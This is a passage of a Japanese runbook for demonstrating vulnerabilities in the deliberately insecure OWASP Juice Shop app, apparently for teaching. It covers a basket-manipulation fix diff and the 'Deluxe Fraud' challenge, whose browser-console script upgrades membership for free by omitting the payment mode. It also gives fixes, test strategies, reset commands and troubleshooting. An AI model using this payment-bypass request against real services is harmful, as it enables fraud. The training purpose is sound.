@@ -33,16 +33,20 @@ export function addBasketItem () {
       }
     }

+    if (productIds.length !== 1 || basketIds.length !== 1 || quantities.length !== 1) {
+      res.status(400).json({ error: 'Exactly one ProductId, BasketId and quantity are required.' })
+      return
+    }
     const user = security.authenticatedUsers.from(req)
-    if (user && basketIds[0] && basketIds[0] !== 'undefined' && Number(user.bid) != Number(basketIds[0])) { // eslint-disable-line eqeqeq
+    const basketId = Number(basketIds[0])
+    if (!user || !Number.isInteger(basketId) || basketId < 1 || Number(user.bid) !== basketId) {
       res.status(401).send('{\'error\' : \'Invalid BasketId\'}')
     } else {
       const basketItem = {
-        ProductId: productIds[productIds.length - 1],
-        BasketId: basketIds[basketIds.length - 1],
-        quantity: quantities[quantities.length - 1]
+        ProductId: productIds[0],
+        BasketId: basketId,
+        quantity: quantities[0]
       }
-      challengeUtils.solveIf(challenges.basketManipulateChallenge, () => { return user && basketItem.BasketId && basketItem.BasketId !== 'undefined' && user.bid != basketItem.BasketId }) // eslint-disable-line eqeqeq

       const basketItemInstance = BasketItemModel.build(basketItem)
       try {
```

これはこの追加処理に対する差分。設計としては、要求の入口で重複キーを拒否し、検証・認可・在庫確認・保存が同じ解析結果を使う形に揃える。`JSON.parse` 後のオブジェクトだけでは、既に消えた重複キーを検出できない。

### どうテストすれば気付けるか

- **最初に行うAPIテスト:** Bの認証で単一キーのB宛て追加は成功、A宛て追加は拒否を確認する。さらに生JSON文字列で `BasketId: B → A` と `A → B` の両順序を送り、どちらも400、A/Bのカートがどちらも変化しないことを期待する。
- **構造を変えるfuzzing:** キーの重複・順序・欠落を変える。`ProductId` と `quantity` も対象にする。テストクライアントのオブジェクト送信機能では重複が消えるため、生文字列を送る。
- **静的解析:** 認可条件の `basketIds[0]` と保存値の `basketIds[basketIds.length - 1]` を比較する。標準パーサーを前提にした解析では、独自パーサーのモデルや個別レビューが必要になる。
- **プロパティテスト／形式化する条件:** 「認可したカートIDと保存するカートIDは常に同じ」「キーが曖昧な要求では書き込みが起きない」。通常のJSONオブジェクトだけでなく、生の要求本文もモデルに含める。

既存の [カートE2E](../test/cypress/e2e/basket.spec.ts) と [APIテスト](../test/api/basket-item.test.ts) が確認の起点になる。[ZAPのHPPルール](https://www.zaproxy.org/docs/alerts/20014/) はクエリ文字列の区切り文字注入を説明しており、このJSON重複キーのケースまで自動検出できる根拠にはしない。

参考: [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)。

</details>

## 10. Deluxe Fraud（支払い方法を省くと無料で有料会員になれてしまう脆弱性）

**実演順:** Recipe Paywall Bypassの比較を終えてから、最後に実施する。

**開始状態:** Bでログインし、一般会員のまま。Recipe Paywall Bypassを先に終えている。

1. `/#/deluxe-membership` で会費 `49¤` を示す。
2. BのConsoleで、支払い方法を省略した要求を送る。

```js
(async () => {
  const headers = {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${localStorage.getItem('token')}`
  }
  const before = await fetch('/rest/wallet/balance', { headers }).then(r => r.json())
  const response = await fetch('/rest/deluxe-membership', {
    method: 'POST', headers, body: JSON.stringify({})
  })
  const body = await response.json()
  if (!response.ok || !body.data?.token) throw new Error(body.error || '一般会員で実行してください。')
  localStorage.setItem('token', body.data.token)
  document.cookie = `token=${body.data.token}; path=/`
  const after = await fetch('/rest/wallet/balance', {
    headers: { Authorization: `Bearer ${body.data.token}` }
  }).then(r => r.json())
  console.table({ before: before.data, after: after.data })
  console.log(body.data.confirmation)
  location.reload()
})()
```

3. ウォレット残高が変化せず、`You are already a deluxe member!` が表示される。
4. **Deluxe Fraud** が解ける。
5. `/#/recipes` を開くと、フラグなしの通常画面でもDeluxeレシピが読める。前の課金回避との違いを示す。

**復旧:** ログアウトだけでは一般会員に戻らない。次回は新しい一般顧客を登録して実演用メモを作り直すか、次章のリセットからやり直す。

<details>
<summary>脆弱性の詳細</summary>

### 原因：どの支払い分岐も通らず、会員資格の更新へ進める

対象API: `POST /rest/deluxe-membership`。[routes/deluxe.ts の upgradeToDeluxe()](../routes/deluxe.ts) は、以下の2つの分岐でそれぞれ残高やカードを検査する。

```ts
if (req.body.paymentMode === 'wallet') {
```

```ts
if (req.body.paymentMode === 'card') {
```

しかし、どちらにも該当しない入力を拒否する処理がなく、後続の更新処理に到達する。

```ts
const updatedUser = await user.update({ role: security.roles.deluxe, deluxeToken: security.deluxeToken(user.email) })
```

要求本文 `{}`、`paymentMode: null`、未定義の支払い方法などでは、支払い確認を省略したまま会員資格が変わる。分類は入力検証と業務フローの不備。なお、この教材のカード分岐は保存済みカードの所有者と有効期限を確認する模擬処理であり、外部決済サービスによる課金処理はない。

### 修正案：許可した支払い方法以外は、更新前に拒否する

```diff
--- a/routes/deluxe.ts
+++ b/routes/deluxe.ts
@@ -16,6 +16,10 @@ import * as utils from '../lib/utils'
 export function upgradeToDeluxe () {
   return async (req: Request, res: Response, next: NextFunction) => {
     try {
+      if (req.body.paymentMode !== 'wallet' && req.body.paymentMode !== 'card') {
+        res.status(400).json({ status: 'error', error: 'A valid payment mode is required.' })
+        return
+      }
       const user = await UserModel.findOne({ where: { id: req.body.UserId, role: security.roles.customer } })
       if (user == null) {
         res.status(400).json({ status: 'error', error: 'Something went wrong. Please try again!' })
@@ -23,15 +27,13 @@ export function upgradeToDeluxe () {
       }
       if (req.body.paymentMode === 'wallet') {
         const wallet = await WalletModel.findOne({ where: { UserId: req.body.UserId } })
-        if ((wallet != null) && wallet.balance < 49) {
+        if (wallet == null || wallet.balance < 49) {
           res.status(400).json({ status: 'error', error: 'Insuffienct funds in Wallet' })
           return
         } else {
           await WalletModel.decrement({ balance: 49 }, { where: { UserId: req.body.UserId } })
         }
-      }
-
-      if (req.body.paymentMode === 'card') {
+      } else if (req.body.paymentMode === 'card') {
         const card = await CardModel.findOne({ where: { id: req.body.paymentId, UserId: req.body.UserId } })
         if ((card == null) || card.expYear < new Date().getFullYear() || (card.expYear === new Date().getFullYear() && card.expMonth - 1 < new Date().getMonth())) {
           res.status(400).json({ status: 'error', error: 'Invalid Card' })
```

許可リストで今回の分岐回避を防ぎ、ウォレットが存在しない場合も残高確認を成功扱いにしない。カードとウォレットは排他的に選ぶ。実サービスではさらに、課金の成功確認と権限付与を一貫させ、ウォレットの残高確認・引き落とし・会員更新をトランザクション等で整合させる必要がある。

### どうテストすれば気付けるか

- **最初に行うAPIテスト:** 一般会員ごとに、`paymentMode` の省略／null／空文字／未知の文字列／数値／配列／オブジェクトを送る。400を期待し、DBの会員種別・残高・Deluxeトークンが変化せず、新しい認証トークンも発行されないことを確認する。
- **正常系と失敗系:** 残高十分なウォレット、残高不足、ウォレットなし、有効な自分のカード、期限切れカード、他人のカードを比較する。各ケースは新しい一般会員か初期化した状態で行い、既にDeluxeになっていることによる拒否と混同しない。
- **fuzzing／静的解析:** enum相当の項目について、省略と列挙外の値を生成する。制御フロー解析では「wallet分岐にもcard分岐にも入らず `user.update` へ到達する経路」を探す。
- **プロパティテスト／形式化する条件:** 「一般会員からDeluxeへ遷移したなら、許可された支払い方法の検証を通過した」。実決済を扱うシステムなら、これに対応する課金成功も条件に含める。

再現例は [Deluxe E2E](../test/cypress/e2e/deluxe.spec.ts)、通常の支払い分岐は [APIテスト](../test/api/deluxe.test.ts) を参照。残高が変わらないだけで成功判定せず、DBの会員種別や会員限定APIの応答も確認する。

参考: [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)、[OWASP Transaction Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html)。

</details>

## 11. 終了・再実演・復旧

### 11.1 各デモの終わりに確認すること

- B用ウィンドウのAccountメニューが意図したメールアドレスになっている。
- `sessionStorage.bid` はB自身のカートIDに戻っている。
- 注文確認の配送先はB自身に戻している。
- 初回の成功通知と、実際の表示・変更結果を両方確認した。

### 11.2 最初からやり直す場合

アプリは起動時にデータを作り直す。再起動するとデモ用アカウント、住所、カート、メールコード、会員資格なども作り直しになる。

ブラウザのローカルバックアップから解答状況が復元されることがあるので、初回通知を再度見せたい場合は次の順で準備する。

1. A/B両方のブラウザで、開発者ツールのApplication／Storageから `http://localhost:3000` のサイトデータを消す。
2. A/Bのアプリのタブを閉じる。プライベートウィンドウも閉じる。
3. サーバーを停止して起動し直す。
4. ブラウザを開き直し、アカウント・住所・カートを第3章から作り直す。
5. 数値IDを取り直す。以前の住所IDやカートIDは使い回さない。

この作業で作ったDocker環境をリセットする場合:

```sh
docker restart juice-shop-development-20261111
docker exec -d -w /juice-shop juice-shop-development-20261111 sh -c 'npm start > /tmp/juice-shop-demo-app.log 2>&1'
docker exec juice-shop-development-20261111 tail -30 /tmp/juice-shop-demo-app.log
```

`Server listening on port 3000` を確認してからブラウザで準備を再開する。

### 11.3 よくある停止点

| 症状 | 確認・復旧 |
| --- | --- |
| `securityDemoConfig` がない／`null`になる | Bのウィンドウで第3.4節を実行する。別タブへのコピーでは `sessionStorage` が共有されない場合があるので、元のタブを使う |
| ログインユーザーが想定と違う | Accountメニューを確認する。OTPデモ後はAになっているため、Bにログインし直す |
| HTTP 401になる | Bにログインし直す。`localhost` と `127.0.0.1` が混ざっていないか確認する |
| BでAのプレビューを拒否されない | BでなくAにログインしていないか確認する。未認証でも表示されるのがこの演習の欠陥 |
| OTPが見つからない | BのメールボックスでRefresh。`sendTo` のメールアドレス、5分の期限、再発行の有無を確認する |
| OTPは届くが検証できない | 一覧の末尾のコードと、直前に保存した要求IDを組み合わせる。再送後の古いコードは使わない |
| レシピが最初から読める | Bが既にDeluxe会員。新しい一般顧客で再開する |
| 注文確認まで進めない | Bのカートに商品があるか、住所・配送方法・カードを選んだか確認する。残高0のウォレットでは支払い選択を進められない |
| 配送先変更後も表示されない | Aの住所IDとBのカートIDを再確認する。Networkで `/rest/basket/<BのID>/address` の応答を見る |
| 重複キーの要求が拒否される | Bとしてログインし、先頭がBのカートID、末尾がAのカートIDか確認する。本文はオブジェクトでなく文字列にする |
| 成功しても解答通知が出ない | 既に解答済みかスコアボードで確認する。スコアはサーバー全体で共有される |
| DevToolsが貼り付けを制限する | 内容を確認したうえで、そのブラウザが案内する操作に従う。アプリの不具合ではない |

## 12. リハーサルと検証済み範囲

新規4件のCypress E2Eと既存Deluxe演習は実行済み。View BasketとManipulate Basketは既存の実装・Cypress手順に照合した比較用の説明であり、この手順書の作成時には通しのライブ実演を追加実行していない。

```sh
npx cypress run --spec 'test/cypress/e2e/emailLogin.spec.ts,test/cypress/e2e/recipes.spec.ts,test/cypress/e2e/addressBoundaries.spec.ts,test/cypress/e2e/deluxe.spec.ts'
```

E2Eを実行すると、実演用サーバーの一部アカウントや解答状況も変化する。リハーサル後に初回状態で見せる場合は、第11.2節から準備する。

ビルド・lint・RSN、単体・APIテストの結果と既存のAPIテスト13件の失敗については、[検証結果](ai-discovered-web-vulnerability-demos.md#検証結果2026-11-11)を参照。

## 13. 発見に使うテストをどう選ぶか

この7件では、**正常な要求を1つ確保し、ユーザー・参照先・認証状態・任意パラメーターを変えて、許可されない結果が出ないかを検査する**のが出発点になる。HTTP 200や500の数だけで判定せず、応答の内容と更新後の状態まで見る。

「OWASPの観点でスキャンする」ときは、[WSTG](https://owasp.org/www-project-web-security-testing-guide/) のテスト観点と、ZAP等で実行する動的検査（DAST）を組み合わせる。自動検査に渡す「誰に何を許可するか」の期待値は、アプリの仕様から定義する。

| 手法 | このデモでの使い方 | 検出の条件・限界 |
| --- | --- | --- |
| API統合テスト／E2E | A/Bの要求を入れ替え、コード配送からログインまで通し、応答とDBの変化を確認する | 所有者・会員種別・許可される遷移を期待値に書く。正常系だけでは認可の抜けを検出できない |
| DAST／ZAP | 同じURLをA/B/未認証で再送し、権限の差を確認する | 認証設定とアクセス規則が必要。本文中の住所参照やOTPの複数段階フローは、専用の再送スクリプトやシナリオも用意する |
| 静的解析（SAST）／コードレビュー | 入力→認可条件→DB検索・更新→応答を追い、条件の欠落や判定値の食い違いを見つける | 「この住所は誰のものか」等の仕様や、独自パーサーの意味を解析に与える必要がある。汎用ルールの検出結果だけで判断しない |
| fuzzing／プロパティベーステスト | 他人の既知ID、フラグの反転、省略値、重複キー、要求の順序を生成する | クラッシュ以外に「他人の情報が返らない」「権限が変わらない」という判定条件が必要。重複キーは生JSONで生成する |
| 形式検証／モデル検査 | 各章の条件を不変条件として記述し、全てのモデル上の状態遷移で守られるかを検証する | 認証状態・所有関係・配送先・パース結果等をモデルに含める。モデルの証明を実装へ適用するには、実装との対応も確かめる |

ZAPの [Access Control Testing](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/) も、ユーザーごとのアクセス規則を設定して検査する仕組みになっている。通常のスキャンで警告が出なかったことだけでは、この7件の業務上の認可が正しいとは判断できない。

実施する順番は、次のとおり。

1. **期待する安全性を書く。** 例: 「BはAの住所を読めず、自分のカートにも設定できない」。
2. **正常系と禁止ケースを対にする。** Bの自分宛て操作は成功し、Aを参照した場合だけ拒否されることを確認する。
3. **APIテストで固定し、入力や順序を広げる。** 住所ID、認証情報の有無、boolean、重複キー、支払い方法等を生成する。
4. **重要な条件を形式化する。** プロパティテストは生成したケースの検査、形式証明は定義したモデルと仮定の下での性質の保証。用途と保証範囲を分けて説明する。

本書に記載した不変条件は形式検証の仕様案であり、証明を実施した結果ではない。また、このリポジトリの再現テストは脆弱性が成立すると成功する。修正案を評価するテストでは、安全な期待値へ変え、修正前には失敗し、修正後には成功することを確認する。
